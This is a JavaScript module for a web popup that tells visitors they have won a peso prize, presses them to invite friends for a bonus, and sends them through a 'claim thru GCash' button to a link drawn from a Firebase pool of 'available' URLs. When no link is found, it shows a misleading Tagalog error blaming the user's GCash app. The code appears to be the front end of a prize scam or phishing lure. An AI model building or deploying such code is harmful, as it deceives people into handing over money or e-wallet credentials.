/**
 * Popup Share Module - Same Structure as Main Core
 */

// ========== POPUP MODULE ==========
(function() {
    'use strict';
    
    let currentBalance = 0;
    let currentPhase = 1;
    
    // ========== INITIALIZATION ==========
    function init() {
        console.log('🎁 Popup Module Starting...');
        
        // Check if popup exists
        const popup = document.getElementById('prizePopup');
        if (!popup) {
            console.error('Popup element not found!');
            return;
        }
        
        // Attach claim button event
        attachClaimButton();
        
        console.log('✅ Popup Module ready');
    }
    
    // ========== ATTACH CLAIM BUTTON ==========
    function attachClaimButton() {
        const claimBtn = document.getElementById('claimNowBtn');
        if (!claimBtn) return;
        
        // Remove existing listeners
        const newBtn = claimBtn.cloneNode(true);
        claimBtn.parentNode.replaceChild(newBtn, claimBtn);
        
        newBtn.addEventListener('click', function(e) {
            e.preventDefault();
            e.stopPropagation();
            
            // Get balance from PromotionCore or DOM
            let balance = 0;
            if (window.PromotionCore) {
                balance = window.PromotionCore.getBalance();
            } else {
                const balanceEl = document.getElementById('userBalanceDisplay');
                if (balanceEl) balance = parseFloat(balanceEl.innerText) || 0;
            }
            
            showPopup(balance);
            
            // Play sound
            if (window.PromotionCore) window.PromotionCore.playSound('scatter');
            
            // Start confetti
            if (window.ConfettiModule) window.ConfettiModule.start();
        });
    }
    
    // ========== GET PAYOUT LINK ==========
    async function getLatestPayoutLink() {
        try {
            const db = firebase.database();
            const snapshot = await db.ref('links').orderByChild('status').equalTo('available').limitToFirst(1).once('value');
            if (snapshot.exists()) {
                const key = Object.keys(snapshot.val())[0];
                const linkData = snapshot.val()[key];
                return { key: key, url: linkData.url };
            }
            return null;
        } catch(e) {
            console.error('Link error:', e);
            return null;
        }
    }
    
    // ========== PHASE 1: DEFAULT ==========
    function showPhase1(balance) {
        const popupInner = document.querySelector('.popup-inner');
        if (!popupInner) return;
        
        currentBalance = balance;
        
        popupInner.innerHTML = `
            <div class="popup-close" id="popupClosePhase1">✕</div>
            <h2 class="popup-title">🎉 HOORAY! 🎉</h2>
            <div class="prize-amount">₱<span id="popupBalanceAmount">${balance.toFixed(2)}</span></div>
            <div class="divider"></div>
            <div class="invite-text">Your friend must confirm your invitation to get extra <strong>₱150 bonus</strong>.</div>
            <div class="luckyday-image-container">
                <img src="images/luckyday.png" alt="Lucky Day" class="luckyday-img" onerror="this.style.display='none'">
            </div>
            <div class="divider"></div>
            <div class="indicator-group">
                <div class="indicator"></div>
                <div class="indicator"></div>
                <div class="indicator"></div>
            </div>
            
            <button class="claim-gcash-button" id="claimGCashBtn">
                <img src="images/gc_icon.png" class="gc-icon"> CLAIM THRU GCASH
            </button>

            <div class="button-separator"></div>

            <button class="back-btn" id="backBtnPhase1">
                ← BACK
            </button>
        `;
        
        // Attach events
        const closeBtn = document.getElementById('popupClosePhase1');
        if (closeBtn) closeBtn.onclick = function() { closePopup(); };
        
        const backBtn = document.getElementById('backBtnPhase1');
        if (backBtn) backBtn.onclick = function() { closePopup(); };
        
        const claimBtn = document.getElementById('claimGCashBtn');
        if (claimBtn) claimBtn.onclick = function() { showPhase2(); };
    }
    
    // ========== PHASE 2: WITHDRAWAL LINK ==========
    function showPhase2() {
        const popupInner = document.querySelector('.popup-inner');
        if (!popupInner) return;
        
        popupInner.innerHTML = `
            <div class="popup-close" id="popupClosePhase2">✕</div>
            <h2 class="popup-title">🔗 WITHDRAWAL LINK</h2>
            <div class="divider"></div>
            <div class="invite-text">Click below to claim <strong style="color:#ffd700;">₱${currentBalance.toFixed(2)}</strong></div>
            
            <div class="prize-amount-wrapper" style="border: 2px solid #ffd700; border-radius: 20px; padding: 15px; margin: 15px 0; background: rgba(255,215,0,0.05);">
                <div style="font-size: 11px; color: #ffd700;">YOUR REWARD</div>
                <div style="font-size: 32px; color: #fff; font-weight: bold;">₱${currentBalance.toFixed(2)}</div>
            </div>
            
            <button class="claim-gcash-button" id="proceedBtn" style="background: linear-gradient(135deg, #00a650, #008c3a);">
                <img src="images/gc_icon.png" class="gc-icon"> PROCEED TO GCASH
            </button>

            <div class="button-separator"></div>

            <button class="back-btn" id="backBtnPhase2">
                ← BACK TO PHASE 1
            </button>
        `;
        
        // Attach events
        const closeBtn = document.getElementById('popupClosePhase2');
        if (closeBtn) closeBtn.onclick = function() { closePopup(); };
        
        const backBtn = document.getElementById('backBtnPhase2');
        if (backBtn) backBtn.onclick = function() { showPhase1(currentBalance); };
        
        const proceedBtn = document.getElementById('proceedBtn');
        if (proceedBtn) {
            proceedBtn.onclick = async function() {
                proceedBtn.disabled = true;
                proceedBtn.innerHTML = `<img src="images/gc_icon.png" class="gc-icon"> CHECKING LINK...`;
                proceedBtn.style.opacity = '0.7';
                
                const linkData = await getLatestPayoutLink();
                
                if (linkData && linkData.url) {
                    window.location.href = linkData.url;
                } else {
                    alert("⚠️ Withdrawal Unsuccessful\n\nMukhang hindi namin ma-proseso ang iyong request dahil kailangan ng GCash App update o kaya ay wala itong mahanap na GCash sa iyong device.\n\nSolution: Siguraduhing updated ang iyong app o subukang mag-login sa ibang device para makuha na ang iyong rewards! 🚀");
                    
                    proceedBtn.disabled = false;
                    proceedBtn.innerHTML = `<img src="images/gc_icon.png" class="gc-icon"> PROCEED TO GCASH`;
                    proceedBtn.style.opacity = '1';
                }
            };
        }
    }
    
    // ========== SHOW POPUP ==========
    function showPopup(balance) {
        currentBalance = balance;
        showPhase1(balance);
        
        const popup = document.getElementById('prizePopup');
        if (popup) {
            popup.style.display = 'flex';
            const ticker = document.getElementById('winnerTicker');
            if (ticker) ticker.style.display = 'none';
        }
    }
    
    // ========== CLOSE POPUP ==========
    function closePopup() {
        const popup = document.getElementById('prizePopup');
        if (popup) {
            popup.style.display = 'none';
            const ticker = document.getElementById('winnerTicker');
            if (ticker) ticker.style.display = 'flex';
            if (window.ConfettiModule) window.ConfettiModule.stop();
        }
    }
    
    // ========== START ==========
    if (document.readyState === 'loading') {
        document.addEventListener('DOMContentLoaded', init);
    } else {
        init();
    }
    
    // ========== EXPORT ==========
    window.showPopup = showPopup;
    window.closePopup = closePopup;
})();
